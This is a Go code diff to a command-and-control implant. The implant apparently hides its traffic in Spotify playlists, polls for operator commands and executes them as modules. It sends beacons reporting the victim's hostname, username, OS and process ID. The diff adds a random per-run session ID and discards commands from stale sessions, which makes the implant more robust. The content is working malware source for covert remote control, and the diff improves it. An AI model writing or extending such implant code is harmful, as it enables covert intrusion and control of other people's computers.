@@ -2,6 +2,7 @@ package c2
 
 import (
 	"context"
+	crand "crypto/rand"
 	"encoding/json"
 	"fmt"
 	"hash/adler32"
@@ -18,13 +19,15 @@ import (
 
 // Implant polls for commands and executes them.
 type Implant struct {
-	client          *spotify.Client
-	key             string
-	interval        int
-	jitter          int
-	processedSeqs   map[int]bool
-	checkinPending  bool
+	client           *spotify.Client
+	key              string
+	interval         int
+	jitter           int
+	processedSeqs    map[int]bool
+	checkinPending   bool
 	consecutiveFails int
+	sessionID        string // unique per run, binds all commands
+	clientID         string
 }
 
 // NewImplant creates a new implant.
@@ -38,13 +41,22 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 	if jitter >= interval {
 		jitter = interval / 2
 	}
+	// Generate unique session ID for this run
+	sessionBytes := make([]byte, 8)
+	crand.Read(sessionBytes)
+	sessionID := fmt.Sprintf("%x", sessionBytes)
+	clientID := getClientID(key)
+
 	fmt.Printf("[*] Polling every %d-%ds\n", interval-jitter, interval+jitter)
+	fmt.Printf("[*] Session: %s\n", sessionID[:12])
 	return &Implant{
 		client:        client,
 		key:           key,
 		interval:      interval,
 		jitter:        jitter,
 		processedSeqs: make(map[int]bool),
+		sessionID:     sessionID,
+		clientID:      clientID,
 	}
 }
 
@@ -79,7 +91,6 @@ func getClientID(encryptionKey string) string {
 // sendCheckin sends a check-in beacon so the operator knows we connected.
 func (imp *Implant) sendCheckin() {
 	ctx := context.Background()
-	clientID := getClientID(imp.key)
 
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USER")
@@ -88,18 +99,19 @@ func (imp *Implant) sendCheckin() {
 	}
 
 	checkinData := map[string]interface{}{
-		"client_id": clientID,
-		"ip_hash":   clientID,
-		"hostname":  hostname,
-		"os":        runtime.GOOS + "/" + runtime.GOARCH,
-		"user":      username,
-		"pid":       os.Getpid(),
+		"client_id":  imp.clientID,
+		"session_id": imp.sessionID,
+		"hostname":   hostname,
+		"os":         runtime.GOOS + "/" + runtime.GOARCH,
+		"user":       username,
+		"pid":        os.Getpid(),
 	}
 
 	dataBytes, _ := json.Marshal(checkinData)
 	result := protocol.NewC2Message("checkin", 0)
 	result.Status = "ok"
 	result.Data = string(dataBytes)
+	result.SessionID = imp.sessionID
 
 	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
 	if err != nil {
@@ -139,7 +151,7 @@ func (imp *Implant) sendCheckin() {
 		return
 	}
 	fmt.Printf("[*] Check-in sent (client_id=%s) at %s\n",
-		clientID, time.Now().Format("15:04:05"))
+		imp.clientID, time.Now().Format("15:04:05"))
 	imp.checkinPending = false
 }
 
@@ -318,6 +330,14 @@ func (imp *Implant) pollAndExecute() {
 		}
 
 		msg := protocol.FromCommandMap(cmdDict)
+
+		// Validate session ID — reject commands from stale sessions
+		if msg.SessionID != "" && msg.SessionID != imp.sessionID {
+			_ = imp.client.CleanC2Playlists(ctx,
+				protocol.ChannelCmd, imp.key, seqNum)
+			continue
+		}
+
 		fmt.Printf("[*] Executing seq=%d module=%s\n", seqNum, msg.Module)
 
 		result := imp.execute(msg)
@@ -332,19 +352,21 @@ func (imp *Implant) execute(msg *protocol.C2Message) *protocol.C2Message {
 	mod := GetModule(msg.Module)
 	if mod == nil {
 		return &protocol.C2Message{
-			Module: msg.Module,
-			Seq:    msg.Seq,
-			Status: "error",
-			Data:   fmt.Sprintf("Unknown module: %s", msg.Module),
+			Module:    msg.Module,
+			Seq:       msg.Seq,
+			Status:    "error",
+			Data:      fmt.Sprintf("Unknown module: %s", msg.Module),
+			SessionID: imp.sessionID,
 		}
 	}
 
 	status, data := mod.Execute(msg.Args)
 	return &protocol.C2Message{
-		Module: msg.Module,
-		Seq:    msg.Seq,
-		Status: status,
-		Data:   data,
+		Module:    msg.Module,
+		Seq:       msg.Seq,
+		Status:    status,
+		Data:      data,
+		SessionID: imp.sessionID,
 	}
 }
 
